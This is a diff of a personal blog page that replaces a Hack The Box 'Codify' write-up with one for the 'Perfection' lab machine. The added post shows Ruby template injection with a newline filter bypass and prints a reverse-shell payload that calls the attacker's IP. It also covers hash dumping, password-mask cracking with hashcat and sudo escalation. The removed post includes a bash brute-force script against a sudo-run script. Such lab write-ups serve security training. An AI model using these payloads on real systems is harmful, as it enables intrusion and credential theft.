@@ -27,22 +27,22 @@
   
   <meta name="theme-color" content="#000000" />
   <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>HTB Codify Writeup | Gabriel blog</title>
+<title>HTB Perfection writeup | Gabriel blog</title>
 <meta name="generator" content="Jekyll v3.9.5" />
-<meta property="og:title" content="HTB Codify Writeup" />
+<meta property="og:title" content="HTB Perfection writeup" />
 <meta name="author" content="gabri47" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="In this machine, first we have a web vulnerable to nodejs rce that give us access to as “svc” user, then we can move to user “joshua” because the credential is hashed in a sqlite3 db file. Later, to escalate as root we have to abuse sudoers privilege to bruteforce a password with the “*” character in bash (because a misconfiguration in the script) that is reused for “root” password in system." />
-<meta property="og:description" content="In this machine, first we have a web vulnerable to nodejs rce that give us access to as “svc” user, then we can move to user “joshua” because the credential is hashed in a sqlite3 db file. Later, to escalate as root we have to abuse sudoers privilege to bruteforce a password with the “*” character in bash (because a misconfiguration in the script) that is reused for “root” password in system." />
-<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Codify.html" />
-<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Codify.html" />
+<meta name="description" content="Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it’s possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group." />
+<meta property="og:description" content="Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it’s possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Perfection.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Perfection.html" />
 <meta property="og:site_name" content="Gabriel blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2024-04-05T00:00:00+02:00" />
+<meta property="article:published_time" content="2024-07-06T00:00:00+02:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HTB Codify Writeup" />
+<meta property="twitter:title" content="HTB Perfection writeup" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-04-05T00:00:00+02:00","datePublished":"2024-04-05T00:00:00+02:00","description":"In this machine, first we have a web vulnerable to nodejs rce that give us access to as “svc” user, then we can move to user “joshua” because the credential is hashed in a sqlite3 db file. Later, to escalate as root we have to abuse sudoers privilege to bruteforce a password with the “*” character in bash (because a misconfiguration in the script) that is reused for “root” password in system.","headline":"HTB Codify Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Codify.html"},"url":"http://localhost:4000/writeups/2024/HTB/Codify.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-07-06T00:00:00+02:00","datePublished":"2024-07-06T00:00:00+02:00","description":"Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it’s possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group.","headline":"HTB Perfection writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Perfection.html"},"url":"http://localhost:4000/writeups/2024/HTB/Perfection.html"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -384,7 +384,7 @@
       <h1 class="d-flex w-100 justify-content-between">
         
         
-          <span>HTB Codify Writeup</span> <span class="points"> [20 pts] </span>
+          <span>HTB Perfection writeup</span> <span class="points"> [20 pts] </span>
         
         
       </h1>
@@ -393,6 +393,8 @@
 <script>
 
 </script>
+
+<p>Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it’s possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group.</p>
     
       <h1 id="enumeration">
         
@@ -401,353 +403,313 @@
         
         
       </h1>
-<p>First we start with a port scanning on the machine’s ip to identify ports opened:</p>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
 
-<pre><code class="language-bash">❯ sudo nmap -sVC -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.239 -oN targeted
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 22:20 CEST
-Nmap scan report for 10.10.11.239
-Host is up (0.12s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.253
+# Nmap 7.94SVN scan initiated Sat Jul  6 16:34:55 2024 as: nmap -sS -sVC --open --min-rate 5000 -v -n -Pn -p- -oN perfection 10.10.11.253
+Nmap scan report for 10.10.11.253
+Host is up (0.042s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
-|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
-80/tcp   open  http    Apache httpd 2.4.52
-|_http-title: Did not follow redirect to http://codify.htb/
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-3000/tcp open  http    Node.js Express framework
-|_http-title: Codify
-Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
+|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
+80/tcp open  http    nginx
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Weighted Grade Calculator
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 36.27 seconds
+# Nmap done at Sat Jul  6 16:35:14 2024 -- 1 IP address (1 host up) scanned in 19.47 seconds
 </code></pre>
+
 <ul>
   <li>-sVC: Identifies service and version.</li>
   <li>-p-: scans all the range of ports (1-65535).</li>
   <li>–open: shows only open ports and not filtered or closed.</li>
   <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
-  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
   <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
   <li>-Pn: Disables host discovery protocol (ping).</li>
-  <li>-oN targeted: Exports the evidence to a file with name “targeted”.</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
 </ul>
 
-<p>We see three ports:</p>
-
-<ul>
-  <li>22: ssh -&gt; we don’t have valid credentials so we can’t do anything</li>
-  <li>80: web -&gt; Apache</li>
-  <li>3000: web -&gt; Node.js express</li>
-</ul>
-
-<p>Let’s enumerate the web port 80 now:</p>
-
-<pre><code class="language-bash">❯ whatweb http://10.10.11.239
-http://10.10.11.239 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.239], RedirectLocation[http://codify.htb/], Title[301 Moved Permanently]
-http://codify.htb/ [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.239], Title[Codify], X-Powered-By[Express]
-</code></pre>
-
-<p>We have a redirect to a domain so let’s add it to the /etc/hosts file:</p>
-
-<pre><code class="language-bash">❯ tail -n 1 /etc/hosts
-10.10.11.239 codify.htb
-</code></pre>
-
-<p>Now let’s visit the web:</p>
-
-<p><img src="/assets/images/Codify/web-main.png" alt="Branching" /></p>
-
-<p>We have a node.js code editor. We could try a rce payload but it’s blocked:</p>
-
-<p><img src="/assets/images/Codify/child_process-blocked.png" alt="Branching" /></p>
-
-<p>Since we can’t RCE, let’s look the about page to look if they say some technologies used:</p>
-
-<p><img src="/assets/images/Codify/about-page.png" alt="Branching" /></p>
-
-<p>They say that they are using <a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16">vm2</a> and if we click there we can see the version 3.9.16. Searching in google we can see <a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">this article</a> that give us a payload, so let’s try to print the result of whoami:</p>
-
-<p><img src="/assets/images/Codify/rce.png" alt="Branching" /></p>
-
-<p>We have RCE!</p>
+<p>We can see port 22 for ssh and 80 for http.</p>
     
-      <h1 id="foothold">
+      <h2 id="web-enumeration">
         
         
-          Foothold <a href="#foothold" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>First, looking at the headers, we can see that the server consists of a webrick (ruby), which is something we will need later:</p>
+
+<pre><code class="language-bash">❯ curl -v http://10.10.11.253
+*   Trying 10.10.11.253:80...
+* Connected to 10.10.11.253 (10.10.11.253) port 80
+&gt; GET / HTTP/1.1
+&gt; Host: 10.10.11.253
+&gt; User-Agent: curl/8.7.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Sat, 06 Jul 2024 14:38:21 GMT
+&lt; Content-Type: text/html;charset=utf-8
+&lt; Content-Length: 3842
+&lt; Connection: keep-alive
+&lt; X-Xss-Protection: 1; mode=block
+&lt; X-Content-Type-Options: nosniff
+&lt; X-Frame-Options: SAMEORIGIN
+&lt; Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>Taking a look to the web, its possible to see that it’s a tool to calculate the total grade in a class:</p>
+
+<p><img src="/assets/images/Perfection/main-web-page.png" alt="main page" /></p>
+
+<p>Clicking “Calculate your weighted grade” and entering data, we can see that the categories are reflected in the page:</p>
+
+<p><img src="/assets/images/Perfection/reflected-values-calculating.png" alt="reflected values calculating" /></p>
+
+<p>I will intercept with burpsuite and send it to repeater to test for <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby">ruby SSTI</a> (because it’s ruby), but the characters (remember to urlencode it) are blacklisted:</p>
+
+<p><img src="/assets/images/Perfection/input-blocked.png" alt="Input blocked" /></p>
+
+<p>However, inserting a string and %0a (which is a line feed urlencoded) before the payload works. This is known as CRLF injection:</p>
+
+<p><img src="/assets/images/Perfection/crlf-injection-works.png" alt="CRLF injection works" /></p>
+    
+      <h1 id="access-as-susan">
+        
+        
+          Access as susan <a href="#access-as-susan" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
         
         
       </h1>
-<p>Let’s spawn a reverse shell and stabilize the tty for doing ctrl+c correctly:</p>
 
-<p><img src="/assets/images/Codify/reverse-shell-web.png" alt="Branching" /></p>
+<p>Now we can insert a payload to gain access to the machine via reverse shell after spawning a nc listener:</p>
 
 <pre><code class="language-bash">❯ nc -lvnp 443
 listening on [any] 443 ...
-connect to [10.10.14.124] from (UNKNOWN) [10.10.11.239] 53976
-bash: cannot set terminal process group (1267): Inappropriate ioctl for device
+</code></pre>
+
+<p><img src="/assets/images/Perfection/reverse-shell.png" alt="Reverse shell" /></p>
+
+<blockquote>
+  <p>SSTI Payload used: <code>&lt;%= system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.15.19/443 0&gt;&amp;1"') %&gt;</code></p>
+</blockquote>
+
+<p>We successfully gained access as susan:</p>
+
+<pre><code class="language-bash">connect to [10.10.15.19] from (UNKNOWN) [10.10.11.253] 45704
+bash: cannot set terminal process group (993): Inappropriate ioctl for device
 bash: no job control in this shell
-svc@codify:~$ script /dev/null -c bash
+susan@perfection:~/ruby_app$ 
+</code></pre>
+
+<p>Now do the common tty trick to having a completely interactive shell, do ctrl+c, ctrl+l, etc:</p>
+
+<pre><code class="language-bash">susan@perfection:~/ruby_app$ script /dev/null -c bash
 script /dev/null -c bash
 Script started, output log file is '/dev/null'.
-svc@codify:~$ ^Z
-zsh: suspended  nc -lvnp 443
-                                                                                                                                                                                        
+susan@perfection:~/ruby_app$ ^Z
+[1]  + 38875 suspended  nc -lvnp 443
 ❯ stty raw -echo;fg
-[1]  + continued  nc -lvnp 443
-                              reset xterm
-svc@codify:~$ export TERM=xterm
-svc@codify:~$ export SHELL=bash
+[1]  + 38875 continued  nc -lvnp 443
+                                    reset xterm
+susan@perfection:~/ruby_app$ export TERM=xterm
+susan@perfection:~/ruby_app$ export SHELL=bash
+susan@perfection:~/ruby_app$ stty rows 50 cols 184
 </code></pre>
+
 <ul>
   <li><code>script /dev/null -c bash</code>: Spawns a tty</li>
   <li><code>ctrl+z</code>: puts the shell in background for later doing a treatment</li>
-  <li><code>stty raw -echo;fg</code>: give us the shell back again</li>
+  <li><code>stty raw -echo; fg</code>: give us the shell back again</li>
   <li><code>reset xterm</code>: resets the terminal to give us the bash console</li>
   <li><code>export TERM=xterm</code>: let us do ctrl+l to clean the terminal</li>
   <li><code>export SHELL=bash</code>: specifies the system that we are using a bash console</li>
 </ul>
 
-<p>Let’s enumerate the config files for the webservers:</p>
+<p>And we can see user.txt:</p>
 
-<p><img src="/assets/images/Codify/var-www-enum.png" alt="Branching" /></p>
-
-<p>The contact folder is for the :3000 service and editor from the :80 one.
-In the contact folder there is a sqlite3 db file:</p>
-
-<pre><code class="language-bash">svc@codify:/var/www/contact$ ls -l tickets.db 
--rw-r--r-- 1 svc svc 20480 Sep 12  2023 tickets.db
+<pre><code class="language-bash">susan@perfection:~/ruby_app$ cd ~
+susan@perfection:~$ cat user.txt 
+5f****************************3e
 </code></pre>
+    
+      <h1 id="privilege-escalation-to-root">
+        
+        
+          Privilege escalation to root <a href="#privilege-escalation-to-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
 
-<p>Let’s enumerate it:</p>
+<p>In the Migration directory, we have a sqlite database where we can extract some hashes:</p>
 
-<pre><code class="language-bash">svc@codify:/var/www/contact$ sqlite3 tickets.db 
+<pre><code class="language-bash">susan@perfection:~$ cd Migration/
+susan@perfection:~/Migration$ ls
+pupilpath_credentials.db
+susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
 SQLite version 3.37.2 2022-01-06 13:25:41
 Enter ".help" for usage hints.
-sqlite&gt; .tables
-tickets  users  
-sqlite&gt; select * from users;
-3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+sqlite&gt;
 </code></pre>
 
-<p>We have joshua’s hash, let’s crack it in our machine:</p>
+<pre><code class="language-bash">sqlite&gt; .tables
+users
+sqlite&gt; select * from users;
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+</code></pre>
 
-<pre><code class="language-bash">❯ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
-Analyzing '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
-[+] Blowfish(OpenBSD) 
-[+] Woltlab Burning Board 4.x 
-[+] bcrypt 
-                                                                                                            
-❯ hashcat --example-hashes | grep bcrypt -B 4
-  Custom.Plugin.......: No
-  Plaintext.Encoding..: ASCII, HEX
+<p>This hashes are SHA256. However they are not crackable with rockyou:</p>
 
-Hash mode #3200
-  Name................: bcrypt $2*$, Blowfish (Unix)
-&lt; -- SNIP -- &gt;
+<pre><code class="language-bash">❯ cat hashes.txt
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: hashes.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ susan:abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+   2   │ tina:dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+   3   │ harry:d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+   4   │ david:ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+   5   │ stephen:154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ john -w=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-SHA256
+Using default input encoding: UTF-8
+Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 DONE (2024-07-06 17:13) 0g/s 12693Kp/s 12693Kc/s 63466KC/s -sevim-..*7¡Vamos!
+Session completed. 
+</code></pre>
 
-❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+<p>Something important to take into accounts is that we belong to the sudo group, so if we manage to get susan password, we can execute any command as root:</p>
+
+<pre><code class="language-bash">susan@perfection:~/Migration$ id
+uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
+</code></pre>
+
+<p>Looking at the mail of susan, we can see that tina is advising susan that she needs to update his password due to a migration, and we have the format needed:</p>
+
+<pre><code class="language-bash">susan@perfection:~/Migration$ cat /var/mail/susan 
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+</code></pre>
+
+<p>I will use hashcat to specify the format and try to crack it:</p>
+
+<pre><code class="language-bash">❯ hashcat -m 1400 -a 3 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f' 'susan_nasus_?d?d?d?d?d?d?d?d?d'
 hashcat (v6.2.6) starting
 
-OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-==================================================================================================================================================
-&lt;-- SNIP --&gt;
+&lt;..SNIP..&gt;
 
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
+Time.Started.....: Sat Jul  6 17:29:15 2024 (2 mins, 4 secs)
+Time.Estimated...: Sat Jul  6 17:31:19 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2823.6 kH/s (0.37ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 324558848/1000000000 (32.46%)
+Rejected.........: 0/324558848 (0.00%)
+Restore.Point....: 324556800/1000000000 (32.46%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: susan_nasus_126824210 -&gt; susan_nasus_803824210
+Hardware.Mon.#1..: Util: 49%
 
-$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
-
-&lt;-- SNIP --&gt;
-</code></pre>
-
-<p>So the password for joshua is ‘spongebob1’</p>
-    
-      <h1 id="access-as-joshua">
-        
-        
-          Access as joshua <a href="#access-as-joshua" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
-        
-        
-      </h1>
-
-<pre><code class="language-bash">svc@codify:/var/www/contact$ su joshua
-Password: spongebob1
-joshua@codify:/var/www/contact$ whoami
-joshua
-joshua@codify:/var/www/contact$
-</code></pre>
-
-<p>Now we can see user.txt flag:</p>
-<pre><code class="language-bash">joshua@codify:~$ ls
-user.txt
-joshua@codify:~$ cat user.txt 
-1e8**************************2c6
-</code></pre>
-    
-      <h1 id="access-as-root">
-        
-        
-          Access as root <a href="#access-as-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
-        
-        
-      </h1>
-
-<p>Let’s watch sudoers privileges:</p>
-
-<pre><code class="language-bash">joshua@codify:~$ sudo -l
-[sudo] password for joshua: spongebob1
-Matching Defaults entries for joshua on codify:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User joshua may run the following commands on codify:
-    (root) /opt/scripts/mysql-backup.sh
-</code></pre>
-
-<p>We can run as root that script, let’s take it a look:</p>
-
-<pre><code class="language-bash">joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
-#!/bin/bash
-DB_USER="root"
-DB_PASS=$(/usr/bin/cat /root/.creds)
-BACKUP_DIR="/var/backups/mysql"
-
-read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
-/usr/bin/echo
-
-if [[ $DB_PASS == $USER_PASS ]]; then
-        /usr/bin/echo "Password confirmed!"
-else
-        /usr/bin/echo "Password confirmation failed!"
-        exit 1
-fi
-
-/usr/bin/mkdir -p "$BACKUP_DIR"
-
-databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
-
-for db in $databases; do
-    /usr/bin/echo "Backing up database: $db"
-    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip &gt; "$BACKUP_DIR/$db.sql.gz"
-done
-
-/usr/bin/echo "All databases backed up successfully!"
-/usr/bin/echo "Changing the permissions"
-/usr/bin/chown root:sys-adm "$BACKUP_DIR"
-/usr/bin/chmod 774 -R "$BACKUP_DIR"
-/usr/bin/echo 'Done!'
-</code></pre>
-
-<p>It’s a script that do backups of the mysql databases. There is a misconfiguration in the script in the if statement because the comparision element are unquoted and we can insert special bash characters, let’s see an example:</p>
-
-<p>If we do a normal comparision with the variables unquoted, it works correctly:</p>
-
-<pre><code class="language-bash">❯ password=test1234                                                                                                                                                                                        
-❯ if [[ $password == test1234 ]];then echo "Correct Password"; else echo "Incorrect password";fi
-Correct Password
-</code></pre>
-
-<p>But the interesting thing is that if we put a special character in the variable, it also interpretes in bash:</p>
-
-<pre><code class="language-bash">❯ password=test1234
-                                                                                                                                                                               
-❯ verify_password=t*
-                                                                                                                                                                                
-❯ if [[ $password == $verify_password ]];then echo "Correct Password"; else echo "Incorrect password";fi
-Correct Password
+Started: Sat Jul  6 17:29:00 2024
+Stopped: Sat Jul  6 17:31:20 2024
 </code></pre>
 
 <blockquote>
-  <p>Note: if you want to test this example in local, do it in bash and not in zsh. In zsh it doesn’t works.</p>
+  <p>Note: -a 3 is to specify bruteforce mode and ?d is for digits</p>
 </blockquote>
 
-<p>So we can apply this concept to bruteforce the password and retrieve it in plaintext, I have created this script to automate it:</p>
+<p>And we have the password! Now you can execute bash as root and see root.txt:</p>
 
-<pre><code class="language-bash">#!/bin/bash
-
-chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
-echo "Brute forcing... Wait!"
-password=""
-password_taked=false
-while [[ $password_taked == false ]];do
-	for (( i=0; i&lt;$(echo $chars| tr -d '\n' | wc -c); i++ ));do
-		char="${chars:$i:1}"
-		echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2&gt;/dev/null | grep -i "Password confirmed" &amp;&gt;/dev/null
-		if [[ "$(echo $?)" == "0" ]];then
-			password+=$char
-			echo $password
-			break
-		fi
-	done
-done
-echo $password
+<pre><code class="language-bash">susan@perfection:~/Migration$ sudo bash
+[sudo] password for susan: susan_nasus_413759210
+root@perfection:/home/susan/Migration# cd ~
+root@perfection:~# cat root.txt
+e4****************************ec
 </code></pre>
 
-<p>Let’s execute it:</p>
-
-<pre><code class="language-bash">joshua@codify:/home/joshua$ cd /tmp/
-joshua@codify:/tmp$ vi brute.sh
-&lt;PASTE THE CODE&gt;
-joshua@codify:/tmp$ chmod +x brute.sh
-joshua@codify:/tmp$ ./brute.sh
-</code></pre>
-
-<p><img src="/assets/images/Codify/brute-pass.png" alt="Branching" /></p>
-
-<p>Now let’s see if password of mysql is reused in the system:</p>
-
-<pre><code class="language-bash">joshua@codify:/tmp$ su root
-Password: 
-root@codify:/tmp# whoami
-root
-</code></pre>
-
-<p>We are root! Now we can see the flag and pwn the machine:</p>
-
-<pre><code class="language-bash">root@codify:/tmp# cd
-root@codify:~# ls
-root.txt  scripts
-root@codify:~# cat root.txt
-e5****************************31
-</code></pre>
-
-<p>That’s all guys, hope you enjoyed!</p>
+<p>That’s the machine, hope you liked it! :)</p>
 
 
 <div id="share-links">
   <span id="divider-line">____</span>
   <br><br>
-  <small>5 April 2024</small>
+  <small>6 July 2024</small>
   <div>
     
     Tags:
     
-    <a href="/search?q=nodejs" class="tag" style="font-family: 'Cascadia Code';">nodejs</a>
+    <a href="/search?q=ssti" class="tag" style="font-family: 'Cascadia Code';">ssti</a>
     
-    <a href="/search?q=rce" class="tag" style="font-family: 'Cascadia Code';">rce</a>
+    <a href="/search?q=ruby" class="tag" style="font-family: 'Cascadia Code';">ruby</a>
     
-    <a href="/search?q=sqlite3" class="tag" style="font-family: 'Cascadia Code';">sqlite3</a>
+    <a href="/search?q=crlf-injection" class="tag" style="font-family: 'Cascadia Code';">crlf-injection</a>
     
-    <a href="/search?q=hashes" class="tag" style="font-family: 'Cascadia Code';">hashes</a>
+    <a href="/search?q=sqlite" class="tag" style="font-family: 'Cascadia Code';">sqlite</a>
     
-    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
+    <a href="/search?q=hash-cracking" class="tag" style="font-family: 'Cascadia Code';">hash-cracking</a>
     
-    <a href="/search?q=bash-bruteforcing" class="tag" style="font-family: 'Cascadia Code';">bash-bruteforcing</a>
+    <a href="/search?q=sudo-group" class="tag" style="font-family: 'Cascadia Code';">sudo-group</a>
     
     
 </div>
   <br>
   Share this writeup:&nbsp;
   <a
-    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Codify.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Perfection.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
       class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
   <a
-    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Codify.html&text=Writeup+for+HTB Codify Writeup+from+HTB+held+on+05 April 2024&hashtags=ctf,writeup,Codify,HTB,nodejs,rce,sqlite3,hashes,sudoers,bash-bruteforcing','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Perfection.html&text=Writeup+for+HTB Perfection writeup+from+HTB+held+on+06 July 2024&hashtags=ctf,writeup,Perfection,HTB,ssti,ruby,crlf-injection,sqlite,hash-cracking,sudo-group','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
       class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
   <a
